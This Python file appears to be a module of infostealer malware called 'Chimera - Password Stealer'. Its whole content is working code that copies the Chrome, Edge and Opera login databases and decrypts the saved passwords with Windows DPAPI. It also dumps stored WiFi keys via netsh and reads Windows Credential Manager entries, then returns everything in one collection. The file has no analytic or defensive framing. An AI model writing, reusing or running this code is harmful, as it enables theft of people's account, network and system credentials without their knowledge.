"""
Chimera - Password Stealer
Extracts passwords from browsers and Windows
"""
import os
import sqlite3
import shutil
import json
import base64
import win32crypt
from Crypto.Cipher import AES
import subprocess
import re

class PasswordStealer:
    @staticmethod
    def steal_all():
        """Steal passwords from all sources"""
        passwords = {
            "browsers": [],
            "wifi": [],
            "windows": []
        }
        
        # Steal from browsers
        passwords["browsers"] = PasswordStealer._steal_browsers()
        
        # Steal WiFi passwords
        passwords["wifi"] = PasswordStealer._steal_wifi()
        
        # Steal Windows credentials
        passwords["windows"] = PasswordStealer._steal_windows()
        
        return passwords
    
    @staticmethod
    def _steal_browsers():
        """Steal passwords from Chrome, Edge, etc."""
        passwords = []
        browser_paths = [
            os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"),
            os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"),
            os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data")
        ]
        
        for path in browser_paths:
            if os.path.exists(path):
                try:
                    temp_path = os.path.join(os.environ['TEMP'], 'login_temp.db')
                    shutil.copy2(path, temp_path)
                    
                    conn = sqlite3.connect(temp_path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    
                    for row in cursor.fetchall():
                        url, username, enc_password = row
                        if enc_password:
                            try:
                                password = win32crypt.CryptUnprotectData(enc_password, None, None, None, 0)[1].decode()
                            except:
                                password = ""
                            
                            if password:
                                passwords.append({
                                    "url": url,
                                    "username": username if username else "",
                                    "password": password
                                })
                    
                    conn.close()
                    os.remove(temp_path)
                except:
                    pass
        
        return passwords
    
    @staticmethod
    def _steal_wifi():
        """Steal saved WiFi passwords"""
        wifi = []
        try:
            output = subprocess.check_output('netsh wlan show profiles', shell=True, text=True)
            profiles = re.findall(r'All User Profile\s*:\s*(.+)', output)
            
            for profile in profiles:
                try:
                    result = subprocess.check_output(
                        f'netsh wlan show profile name="{profile.strip()}" key=clear',
                        shell=True, text=True
                    )
                    password_match = re.search(r'Key Content\s*:\s*(.+)', result)
                    if password_match:
                        wifi.append({
                            "ssid": profile.strip(),
                            "password": password_match.group(1).strip()
                        })
                except:
                    continue
        except:
            pass
        return wifi
    
    @staticmethod
    def _steal_windows():
        """Steal Windows credentials"""
        credentials = []
        try:
            import win32cred
            creds = win32cred.CredEnumerate(None, 0)
            for cred in creds:
                if cred['CredentialBlob']:
                    credentials.append({
                        "target": cred['TargetName'],
                        "username": cred['UserName'],
                        "password": cred['CredentialBlob'].decode('utf-8') if cred['CredentialBlob'] else ''
                    })
        except:
            pass
        return credentials
